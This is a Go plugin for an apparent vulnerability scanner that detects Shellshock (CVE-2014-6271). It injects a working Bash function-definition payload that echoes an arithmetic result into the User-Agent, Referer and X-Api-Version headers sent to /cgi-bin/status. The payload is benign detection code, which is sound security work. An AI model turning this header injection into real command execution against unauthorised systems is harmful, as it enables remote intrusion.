package plugins

import (
	"DORM/models"
	"fmt"
	"io"
	"net/http"
	"strings"
)

// 23. SHELLSHOCK SCANNER - v2
type ShellshockPlugin struct{}

func (p *ShellshockPlugin) Name() string { return "Shellshock models.Vulnerability" }

func (p *ShellshockPlugin) Run(target models.ScanTarget) *models.Vulnerability {

	if !isWebPort(target.Port) {
		return nil
	}

	targetURL := getURL(target, "/cgi-bin/status")

	req, _ := http.NewRequest("GET", targetURL, nil)

	randA := 1900
	randB := 52
	expectedResult := "1952"

	payload := fmt.Sprintf("() { :;}; echo; echo $((%d+%d))", randA, randB)

	req.Header.Set("User-Agent", payload)
	req.Header.Set("Referer", payload)
	req.Header.Set("X-Api-Version", payload)

	resp, err := models.GetClient().Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	bodyBytes, _ := io.ReadAll(resp.Body)
	bodyStr := string(bodyBytes)

	if strings.Contains(bodyStr, expectedResult) {
		return &models.Vulnerability{
			Target:      target,
			Name:        "Shellshock (RCE)",
			Severity:    "CRITICAL",
			CVSS:        10.0,
			Description: fmt.Sprintf("Server executed Bash command via HTTP Headers.\nMath Calculation: $((%d+%d)) resulted in '%s'", randA, randB, expectedResult),
			Solution:    "Update Bash immediately (CVE-2014-6271).",
			Reference:   "CVE-2014-6271",
		}
	}

	return nil
}
